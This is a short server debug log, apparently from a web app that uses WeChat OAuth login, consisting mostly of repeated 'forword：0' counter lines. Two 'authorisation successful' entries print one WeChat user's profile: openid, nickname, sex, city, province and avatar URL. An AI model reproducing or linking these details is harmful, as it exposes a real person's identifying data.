[2015-10-17 23:11:02][debug] forword：0
[2015-10-17 23:11:03][debug] forword：0
[2015-10-17 23:11:03][debug] forword：0
[2015-10-17 23:11:04][debug] forword：0
[2015-10-17 23:11:04][debug] forword：0
[2015-10-17 23:11:05][debug] forword：0
[2015-10-17 23:11:05][debug] forword：0
[2015-10-17 23:11:06][debug] forword：0
[2015-10-17 23:11:06][debug] forword：0
[2015-10-17 23:11:07][debug] forword：0
[2015-10-17 23:11:07][debug] forword：0
[2015-10-17 23:11:08][debug] forword：0
[2015-10-17 23:11:08][debug] forword：0
[2015-10-17 23:11:09][debug] forword：0
[2015-10-17 23:11:09][debug] forword：0
[2015-10-17 23:11:09][debug] forword：0
[2015-10-17 23:11:10][debug] forword：0
[2015-10-17 23:11:10][debug] forword：0
[2015-10-17 23:11:11][debug] forword：0
[2015-10-17 23:11:11][debug] forword：0
[2015-10-17 23:11:12][debug] forword：0
[2015-10-17 23:11:12][debug] forword：0
[2015-10-17 23:11:13][debug] forword：0
[2015-10-17 23:11:13][debug] forword：0
[2015-10-17 23:11:14][debug] forword：0
[2015-10-17 23:11:14][debug] forword：0
[2015-10-17 23:11:15][debug] forword：0
[2015-10-17 23:11:15][debug] forword：0
[2015-10-17 23:11:16][debug] forword：0
[2015-10-17 23:11:16][debug] forword：0
[2015-10-17 23:11:17][debug] forword：0
[2015-10-17 23:11:17][debug] forword：0
[2015-10-17 23:11:18][debug] forword：0
[2015-10-17 23:11:18][debug] forword：0
[2015-10-17 23:11:18][debug] forword：0
[2015-10-17 23:11:19][debug] forword：0
[2015-10-17 23:24:18][debug] forword：0
[2015-10-17 23:24:18][debug] forword：0
[2015-10-17 23:24:18][debug] forword：0
[2015-10-17 23:24:18][debug] forword：0
[2015-10-17 23:24:35][debug] --------------------------------------------------------------------
[2015-10-17 23:24:35][debug] 授权成功！
[2015-10-17 23:24:35][debug] 微信用户信息：{"openid":"oXU1ruHBlCbdt4FfVXzVw5LKJrrk","nickname":"金妮","sex":2,"language":"zh_CN","city":"绍兴","province":"浙江","country":"中国","headimgurl":"http:\/\/wx.qlogo.cn\/mmopen\/4tpkVGWUO5bpQFN2Bw5WydfN6E3bmvFcso6baIvicMFAhcYFib0IfYSMzoZP7HKACibTsrzQKfREfZMmdc8icd2GPI7gyPEIzdNk\/0","privilege":[]}
[2015-10-17 23:24:35][debug] --------------------------------------------------------------------
[2015-10-17 23:24:36][debug] forword：0
[2015-10-17 23:24:36][debug] forword：0
[2015-10-17 23:24:36][debug] forword：0
[2015-10-17 23:24:36][debug] forword：0
[2015-10-17 23:25:10][debug] --------------------------------------------------------------------
[2015-10-17 23:25:10][debug] 授权成功！
[2015-10-17 23:25:10][debug] 微信用户信息：{"openid":"oXU1ruHBlCbdt4FfVXzVw5LKJrrk","nickname":"金妮","sex":2,"language":"zh_CN","city":"绍兴","province":"浙江","country":"中国","headimgurl":"http:\/\/wx.qlogo.cn\/mmopen\/4tpkVGWUO5bpQFN2Bw5WydfN6E3bmvFcso6baIvicMFAhcYFib0IfYSMzoZP7HKACibTsrzQKfREfZMmdc8icd2GPI7gyPEIzdNk\/0","privilege":[]}
[2015-10-17 23:25:10][debug] --------------------------------------------------------------------
[2015-10-17 23:25:11][debug] forword：0
[2015-10-17 23:30:56][debug] forword：
[2015-10-17 23:36:42][debug] forword：
[2015-10-17 23:57:10][debug] forword：
[2015-10-17 23:58:20][debug] forword：
